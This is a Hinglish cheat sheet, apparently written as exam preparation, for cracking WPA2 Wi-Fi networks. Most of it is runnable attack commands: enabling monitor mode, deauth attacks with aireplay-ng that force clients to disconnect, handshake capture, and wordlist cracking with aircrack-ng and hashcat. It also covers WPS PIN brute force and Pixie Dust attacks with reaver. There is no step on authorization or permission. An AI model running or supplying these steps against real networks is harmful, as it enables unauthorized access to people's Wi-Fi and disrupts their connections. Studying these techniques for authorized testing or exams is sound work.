# WIFI CRACK KARO — WPA2 Handshake

---

## Pehle Samjho: WPA2 Aur Handshake Kya Hai?

**WPA2 (Wi-Fi Protected Access 2)** — ye WiFi ka security protocol hai jo password se network protect karta hai.

**4-Way Handshake kya hai?**
Jab koi device (phone/laptop) WiFi se connect hota hai toh ek process hoti hai:
1. **Message 1:** Router → Client: "Ye raha ek random number (ANonce)"
2. **Message 2:** Client → Router: "Mere paas bhi ek number hai (SNonce) + proof ki mujhe password pata hai"
3. **Message 3:** Router → Client: "Theek hai, confirmed. Ye raha encryption key"
4. **Message 4:** Client → Router: "Samajh gaya, ready!"

**Kyun important hai?** Is handshake mein password ka hash hota hai. Agar tum ye handshake capture kar lo, toh offline brute force karke password nikal sakte ho — bina router se connect kiye!

**Deauth attack kyun?** Agar koi already connected hai toh handshake nahi hoga. Toh tum deauth packets bhejte ho — client disconnect ho jaata hai aur reconnect karta hai = fresh handshake capture!

---

## CASE 1: Full Attack — Scratch Se Handshake Capture + Crack

### Step 1: Monitor Mode ON Karo
```bash
# Pehle interfering processes kill karo
airmon-ng check kill

# Monitor mode start karo
airmon-ng start wlan0

# Verify: interface name change hoga — wlan0 → wlan0mon
iwconfig
# wlan0mon dikhna chahiye Mode:Monitor ke saath
```

**Monitor mode kya hai?** Normal mode mein WiFi card sirf apne connected network ke packets dekhta hai. Monitor mode mein ye SAARE nearby WiFi packets capture kar sakta hai — including handshakes!

### Step 2: Networks Scan Karo
```bash
airodump-ng wlan0mon
```

**Output samjho:**
```
BSSID              PWR  CH  ENC     ESSID
AA:BB:CC:DD:EE:FF  -45  6   WPA2   TargetNetwork
11:22:33:44:55:66  -70  11  WPA2   NeighborWiFi
```

| Column | Matlab |
|---|---|
| BSSID | Router ka MAC address (ye chahiye target ka) |
| PWR | Signal strength (-45 close hai, -90 door hai) |
| CH | Channel number (ye chahiye) |
| ENC | Encryption type (WPA2 hona chahiye) |
| ESSID | WiFi ka naam |

**Neeche section mein connected clients dikhenge:**
```
STATION            BSSID
FF:FF:FF:FF:FF:FF  AA:BB:CC:DD:EE:FF   ← ye client connected hai
```
Client ka MAC address note karo — deauth ke liye chahiye.

**Ctrl+C** se stop karo jab target identify ho jaye.

### Step 3: Target Network pe Focus + Capture Start
```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 6        = channel number (Step 2 se)
# --bssid     = target router ka MAC
# -w capture  = output file prefix (capture-01.cap banega)
```
**Ye running rehne do!** Naya terminal kholo Step 4 ke liye.

### Step 4: Deauth Attack — Client Ko Force Disconnect Karo
```bash
# Naye terminal mein:
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:FF:FF:FF:FF:FF wlan0mon
# -0 5    = 5 deauth packets bhejo
# -a      = target router BSSID
# -c      = client MAC address (Step 2 se)
```

**Kya hoga:** Client disconnect hoga, phir automatically reconnect karega = handshake generate!

**Step 3 wale terminal mein dekho — top-right corner mein ye dikhna chahiye:**
```
WPA handshake: AA:BB:CC:DD:EE:FF
```
YE DIKHA = HANDSHAKE CAPTURED! Ab Ctrl+C se dono band karo.

**Agar handshake nahi aaya?**
- Zyada deauth packets bhejo: `-0 10` ya `-0 20`
- Client connected hai na? Neeche STATION section mein dikhna chahiye
- Signal weak hai? Physically router ke paas jaao
- `-c` hatao for broadcast deauth: `aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon`

### Step 5: Password Crack Karo
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
# -w = wordlist path
# -b = target BSSID
# capture-01.cap = captured handshake file
```

**Output jab password mile:**
```
KEY FOUND! [ password123 ]
```

**Agar rockyou.txt se nahi mila:**
```bash
# Custom wordlist try karo
aircrack-ng -w /usr/share/wordlists/custom.txt capture-01.cap

# Ya hashcat for GPU cracking (faster):
# Pehle cap ko hccapx mein convert karo:
aircrack-ng capture-01.cap -J capture_hash
hashcat -m 22000 capture_hash.hccapx /usr/share/wordlists/rockyou.txt
```

---

## CASE 2: Handshake File Already Di Hai (Exam Mein Common!)

Bahut baar exam mein handshake file directly milti hai — scanning/deauth ki zarurat nahi.

```bash
# Seedha crack karo:
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap

# Agar specific BSSID specify karna ho:
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake.cap

# Different wordlist:
aircrack-ng -w /usr/share/wordlists/wifite.txt handshake.cap
```

**File extensions jo mil sakti hain:** `.cap`, `.pcap`, `.pcapng` — sab aircrack-ng support karta hai.

---

## CASE 3: WPS Attack — PIN Brute Force

WPS (Wi-Fi Protected Setup) ek feature hai jo 8-digit PIN se connect karne deta hai. Ye brute force ho sakta hai!

```bash
# Step 1: WPS enabled networks dhundho
wash -i wlan0mon
# "WPS Locked" column dekho — "No" chahiye

# Step 2: WPS PIN brute force
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
# -vv = verbose output

# Agar rate limit ho raha hai:
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 10
# -d 10 = 10 second delay between attempts

# Pixie Dust attack (faster, offline):
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K
# -K = pixie dust attack
```

**WPS attack kab karo?** Jab WPA2 password crack nahi ho raha aur WPS enabled hai.

---

## CASE 4: PCAP Mein WiFi Info Dhundho

```bash
# Wireshark mein open karo:
wireshark capture.pcap

# Beacon frames se SSID nikalo:
# Filter: wlan.fc.type_subtype == 0x08
# Ya: wlan.ssid

# tshark se:
tshark -r capture.pcap -Y "wlan.fc.type_subtype==8" -T fields -e wlan.ssid | sort -u
```

---

## CASE 5: Monitor Mode Wapas Normal Karo

```bash
# Attack ke baad normal mode pe wapas:
airmon-ng stop wlan0mon

# Network manager restart:
service NetworkManager start
# Ya:
systemctl start NetworkManager
```

---

## Common Mistakes (Mat Karna Ye)

1. **`airmon-ng check kill` bhool gaye:** NetworkManager interfere karta hai — pehle kill karo
2. **Channel galat diya:** airodump-ng se sahi channel note karo, galat channel pe handshake nahi milega
3. **Client connected nahi hai:** Deauth karne se pehle check karo ki koi client connected hai ya nahi
4. **Handshake capture confirm nahi kiya:** "WPA handshake: MAC" top-right mein dikhna chahiye
5. **Wordlist mein password nahi hai:** rockyou.txt se nahi mila? Custom ya badi wordlist try karo
6. **File path galat:** `capture-01.cap` hoga — `capture.cap` nahi (airodump number add karta hai)
7. **Monitor mode pe stuck:** Attack ke baad `airmon-ng stop` karna mat bhoolna

---

## Quick Decision Tree

```
WiFi question aaya?
  │
  ├─ Handshake file di hai (.cap/.pcap)?
  │    └─ Direct crack: aircrack-ng -w rockyou.txt file.cap
  │
  ├─ Handshake capture karna hai?
  │    ├─ 1. airmon-ng check kill
  │    ├─ 2. airmon-ng start wlan0
  │    ├─ 3. airodump-ng wlan0mon (scan, note BSSID + CH)
  │    ├─ 4. airodump-ng -c CH --bssid MAC -w capture wlan0mon
  │    ├─ 5. aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon (deauth)
  │    ├─ 6. "WPA handshake" confirm karo
  │    └─ 7. aircrack-ng -w rockyou.txt capture-01.cap
  │
  ├─ WPS enabled hai?
  │    ├─ wash -i wlan0mon (check)
  │    └─ reaver -i wlan0mon -b BSSID -vv (brute force)
  │
  ├─ PCAP mein WiFi info chahiye?
  │    └─ Wireshark → beacon frames → SSID
  │
  └─ Password nahi mil raha?
       ├─ Badi/different wordlist try karo
       └─ hashcat for GPU acceleration
```
